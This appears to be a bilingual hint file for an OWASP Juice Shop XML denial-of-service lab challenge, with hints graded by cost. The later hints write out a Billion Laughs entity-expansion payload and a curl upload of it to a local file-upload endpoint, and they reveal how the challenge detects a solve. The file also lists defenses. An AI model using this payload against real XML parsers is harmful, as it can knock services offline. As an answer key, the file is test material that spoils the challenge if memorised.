@@ -1,0 +1,168 @@
+challenge_key: "xxeDosChallenge"
+schema_version: "juicelab.hints.v2"
+
+hints:
+  N1:
+    cost_pct: 5
+    text_fr: |
+      Hint OWASP #1 : "not as easy as sending
+      large amount of data directly". Donc
+      pas brute force file size. Hint #2 :
+      "same leverage as XXE Data Access".
+    text_en: |
+      OWASP hint #1: "not as easy as sending
+      large amount of data directly". So not
+      brute force file size. Hint #2: "same
+      leverage as XXE Data Access".
+    pedagogical_intent: |
+      Activate XXE DoS reflex.
+
+  N2:
+    cost_pct: 10
+    text_fr: |
+      L'attaque classique = "Billion Laughs"
+      ou "XML bomb". Recursive entity
+      expansion exponentielle. Le parser
+      consomme exponential memory/CPU pour
+      expand les entities.
+    text_en: |
+      Classic attack = "Billion Laughs" or
+      "XML bomb". Exponential recursive
+      entity expansion. Parser consumes
+      exponential memory/CPU to expand
+      entities.
+    pedagogical_intent: |
+      Spell attack name.
+
+  N3:
+    cost_pct: 20
+    text_fr: |
+      Source serveur (routes/fileUpload.ts:
+      91-92) : `if (errorMessage contains
+      'Script execution timed out') solve`.
+      Donc le parser doit TIMEOUT (>2sec
+      configure ligne 83). Le billion laughs
+      cause le timeout.
+    text_en: |
+      Server source (routes/fileUpload.ts:
+      91-92): `if (errorMessage contains
+      'Script execution timed out') solve`.
+      So parser must TIMEOUT (>2sec
+      configured line 83). Billion laughs
+      causes timeout.
+    pedagogical_intent: |
+      Reveal solve mechanism.
+
+  N4:
+    cost_pct: 35
+    text_fr: |
+      Payload billion laughs :
+      ```xml
+      <?xml version="1.0"?>
+      <!DOCTYPE lolz [
+        <!ENTITY lol "lol">
+        <!ENTITY lol2 "&lol;&lol;&lol;
+          &lol;&lol;&lol;&lol;&lol;&lol;
+          &lol;">
+        <!ENTITY lol3 "&lol2;&lol2;&lol2;
+          &lol2;&lol2;&lol2;&lol2;&lol2;
+          &lol2;&lol2;">
+        ...
+        <!ENTITY lol9 "...">
+      ]>
+      <lolz>&lol9;</lolz>
+      ```
+      Each level expand x10. 9 levels =
+      10^9 entities = billion laughs.
+    text_en: |
+      Billion laughs payload:
+      ```xml
+      <?xml version="1.0"?>
+      <!DOCTYPE lolz [
+        <!ENTITY lol "lol">
+        <!ENTITY lol2 "&lol;&lol;&lol;
+          &lol;&lol;&lol;&lol;&lol;&lol;
+          &lol;">
+        <!ENTITY lol3 "&lol2;&lol2;&lol2;
+          &lol2;&lol2;&lol2;&lol2;&lol2;
+          &lol2;&lol2;">
+        ...
+        <!ENTITY lol9 "...">
+      ]>
+      <lolz>&lol9;</lolz>
+      ```
+      Each level expands x10. 9 levels =
+      10^9 entities = billion laughs.
+    pedagogical_intent: |
+      Spell exact payload.
+
+  N5:
+    cost_pct: 50
+    text_fr: |
+      [KILL_CHAIN_DOCUMENTED] Workflow :
+      1. Pre-requis :
+         deprecatedInterfaceChallenge.
+      2. Save le billion laughs payload
+         dans `bomb.xml` (9 levels of
+         entity recursion x10 each).
+      3. Upload via curl :
+         ```bash
+         curl -X POST
+           http://localhost:3000/file-upload
+           -F "file=@bomb.xml"
+           -H "Authorization: Bearer
+             <token>"
+         ```
+      4. Le serveur :
+         (a) handleXmlUpload accepte .xml
+         (b) libxml.parseXml entity
+             expansion explose
+         (c) timeout 2000ms reache
+         (d) error message 'Script
+             execution timed out'
+         (e) catch block trigger solve
+             xxeDosChallenge.
+      Note : effectiveness depends on OS
+      (hint #4) - Linux/Mac peuvent
+      timeout differently. Sur Docker,
+      effective.
+      Source : routes/fileUpload.ts:91-92
+      + CVE-2003-1564 + OWASP XXE
+      Prevention.
+      Defense : disable DOCTYPE +
+      entity expansion limits + sandbox
+      memory.
+    text_en: |
+      [KILL_CHAIN_DOCUMENTED] Workflow:
+      1. Prerequisite:
+         deprecatedInterfaceChallenge.
+      2. Save billion laughs payload in
+         `bomb.xml` (9 levels of entity
+         recursion x10 each).
+      3. Upload via curl:
+         ```bash
+         curl -X POST
+           http://localhost:3000/file-upload
+           -F "file=@bomb.xml"
+           -H "Authorization: Bearer
+             <token>"
+         ```
+      4. Server:
+         (a) handleXmlUpload accepts .xml
+         (b) libxml.parseXml entity
+             expansion explodes
+         (c) timeout 2000ms reached
+         (d) error message 'Script
+             execution timed out'
+         (e) catch block triggers solve
+             xxeDosChallenge.
+      Note: effectiveness depends on OS
+      (hint #4) - Linux/Mac may timeout
+      differently. On Docker, effective.
+      Source: routes/fileUpload.ts:91-92
+      + CVE-2003-1564 + OWASP XXE
+      Prevention.
+      Defense: disable DOCTYPE + entity
+      expansion limits + sandbox memory.
+    pedagogical_intent: |
+      Solution + payload + defense.
